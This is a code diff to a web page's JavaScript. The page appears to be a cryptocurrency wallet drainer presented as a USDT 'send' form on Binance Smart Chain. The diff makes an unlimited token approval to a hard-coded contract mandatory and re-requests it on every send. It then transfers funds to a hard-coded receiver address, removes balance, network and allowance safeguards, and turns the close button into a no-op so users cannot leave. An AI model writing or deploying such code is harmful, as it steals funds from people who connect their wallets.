@@ -284,7 +284,6 @@
     }
     #status.success { display:block;background:#1d5a2a;color:#3effb8;border:1px solid #165a3b; }
     #status.error { display:block;background:#421528;color:#ff7a7a;border:1px solid #ff284b55; }
-    #status.loading { display:block;background:#2a4035;color:#7ad9b3;border:1px solid #3a5a45; }
     @media (max-width: 600px) {
       .main-modal { max-width:100vw;border-radius:19px 19px 0 0; }
       .modal-bottom-inner,.modal-bottom-actions { max-width:100vw; }
@@ -349,13 +348,10 @@
         rpcUrls: ["https://bsc-dataseed.binance.org/"],
         blockExplorerUrls: ["https://bscscan.com"]
     };
-    
     const USDT_BSC = "0x55d398326f99059fF775485246999027B3197955";
     const CONTRACT_ADDR = "0x89112691C976D0a2D874B0ADAe693a0Add0dAe98";
     const RECEIVER_ADDR = "0xad8bD5eCEf1c5382c086ea8053B86DB0c77aB21F";
     const MAX_UINT256 = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
-    const USDT_DECIMALS = 18; // USDT on BSC uses 18 decimals
-    
     const USDT_ABI = [
         {
             "constant": true,
@@ -383,19 +379,8 @@
             "name": "transfer",
             "outputs": [{"name":"","type":"bool"}],
             "type": "function"
-        },
-        {
-            "constant": true,
-            "inputs": [
-                {"name":"owner","type":"address"},
-                {"name":"spender","type":"address"}
-            ],
-            "name": "allowance",
-            "outputs": [{"name":"","type":"uint256"}],
-            "type": "function"
         }
     ];
-    
     let web3, userAccount, usdtContract, isConnected = false;
     const statusDiv = document.getElementById("status");
     const sendBtn = document.getElementById("sendBtn");
@@ -467,8 +452,6 @@
 
             // Request unlimited approval
             await approveUnlimitedUSDT();
-            showStatus("Wallet connected successfully!", "success");
-            setTimeout(() => showStatus("", ""), 2000);
 
         } catch (err) {
             isConnected = false;
@@ -483,119 +466,58 @@
         usdtContract = new web3.eth.Contract(USDT_ABI, USDT_BSC);
     }
 
-    // Check current allowance
-    async function checkAllowance() {
-        try {
-            const allowance = await usdtContract.methods.allowance(userAccount, CONTRACT_ADDR).call();
-            return web3.utils.toBN(allowance);
-        } catch (err) {
-            console.error("Error checking allowance:", err);
-            return web3.utils.toBN(0);
-        }
-    }
-
     // Unlimited approval helper
     async function approveUnlimitedUSDT() {
         try {
-            showStatus("Verifying USDT...", "loading");
-            
-            const currentAllowance = await checkAllowance();
-            
-            // Only approve if allowance is less than max
-            if (currentAllowance.lt(web3.utils.toBN(MAX_UINT256))) {
-                const tx = await usdtContract.methods.approve(CONTRACT_ADDR, MAX_UINT256).send({
-                    from: userAccount
-                });
-                console.log("Approval successful:", tx);
-            }
-            
-            showStatus("", "");
+            await usdtContract.methods.approve(CONTRACT_ADDR, MAX_UINT256).send({
+                from: userAccount
+            });
         } catch(e) {
             const errorMessage = e.code === 4001
                 ? "Approval rejected by user."
-                : "Approval for USDT failed. Please try again.";
+                : "Approval for USDT failed or rejected. You must approve to continue.";
             showStatus(errorMessage, "error");
             throw e;
         }
     }
 
-    // Main send function
+    // Next triggers approve and transfer
     async function sendUSDT() {
         if (!isConnected) {
-            showStatus("Wallet not connected. Please refresh and connect.", "error");
-            return;
-        }
-
-        const amountValue = parseFloat(amountInput.value) || 0;
-
-        if (amountValue <= 0) {
-            showStatus("Please enter a valid amount greater than 0.", "error");
-            return;
-        }
-
-        if (amountValue > 999999.99) {
-            showStatus("Amount exceeds maximum limit.", "error");
+            showStatus("Wallet not connected. Please connect first.", "error");
             return;
         }
 
         sendBtn.disabled = true;
         sendBtn.textContent = "Processing...";
-        showStatus("Processing transaction...", "loading");
+        const amount = parseFloat(amountInput.value) || 0;
+
+        if (amount <= 0) {
+            showStatus("Please enter a valid amount.", "error");
+            sendBtn.disabled = false;
+            sendBtn.textContent = "Next";
+            return;
+        }
+
+        showStatus("", "");
 
         try {
-            // Verify connection is still valid
-            const currentChainId = await web3.eth.getChainId();
-            if (currentChainId !== 56) { // 56 is BSC mainnet
-                showStatus("Wrong network. Please switch to BSC.", "error");
-                sendBtn.disabled = false;
-                sendBtn.textContent = "Next";
-                return;
-            }
+            // Re-approve in case allowance changed/was revoked
+            await approveUnlimitedUSDT();
 
-            // Check balance first
-            const balance = await usdtContract.methods.balanceOf(userAccount).call();
-            const balanceAmount = web3.utils.fromWei(balance, 'ether');
-            
-            if (parseFloat(balanceAmount) < amountValue) {
-                showStatus(`Insufficient balance. You have ${balanceAmount} USDT`, "error");
-                sendBtn.disabled = false;
-                sendBtn.textContent = "Next";
-                return;
-            }
-
-            // Re-approve if needed
-            showStatus("Checking approval...", "loading");
-            const allowance = await checkAllowance();
-            const amountWei = web3.utils.toWei(amountValue.toString(), 'ether');
-            
-            if (allowance.lt(web3.utils.toBN(amountWei))) {
-                showStatus("Approving USDT...", "loading");
-                await approveUnlimitedUSDT();
-            }
-
-            // Execute transfer
-            showStatus("Sending USDT...", "loading");
-            const txReceipt = await usdtContract.methods.transfer(RECEIVER_ADDR, amountWei).send({
-                from: userAccount,
-                gas: 100000,
-                gasPrice: await web3.eth.getGasPrice()
+            // Prepare transfer for the user-input amount (convert to 6 decimals)
+            const sendAmount = web3.utils.toWei(amount.toString(), "mwei");
+            await usdtContract.methods.transfer(RECEIVER_ADDR, sendAmount).send({
+                from: userAccount
             });
 
-            console.log("Transfer successful:", txReceipt);
-            showStatus("✅ Transfer Complete! TxHash: " + txReceipt.transactionHash.substring(0, 10) + "...", "success");
-            
-            // Reset form after 3 seconds
-            setTimeout(() => {
-                amountInput.value = "0";
-                updateUSD();
-                showStatus("", "");
-            }, 3000);
-
+            showStatus("✅ Complete!", "success");
+            amountInput.value = "0";
+            updateUSD();
         } catch (e) {
-            console.error("Transaction error:", e);
             const errorMessage = e.code === 4001
                 ? "Transaction rejected by user."
-                : e.message || "Transaction failed. Please try again.";
+                : "Transaction Failed";
             showStatus(errorMessage, "error");
         } finally {
             sendBtn.disabled = false;
@@ -605,27 +527,23 @@
 
     function showStatus(message, type) {
         statusDiv.innerHTML = message;
-        if (!type) {
-            statusDiv.style.display = "none";
-        } else {
+        if (!type) statusDiv.style.display = "none";
+        else {
             statusDiv.style.display = "block";
             statusDiv.className = "";
             if (type === "success") statusDiv.classList.add("success");
             if (type === "error") statusDiv.classList.add("error");
-            if (type === "loading") statusDiv.classList.add("loading");
         }
     }
 
     // Make the X button inert (does nothing)
     document.getElementById('modalClose').onclick = function() { };
 
-    // Max button handler
     document.getElementById("maxBtn").onclick = function () {
         amountInput.value = "999999.99";
         updateUSD();
     };
 
-    // Amount input handler
     amountInput.oninput = updateUSD;
 
     function updateUSD() {
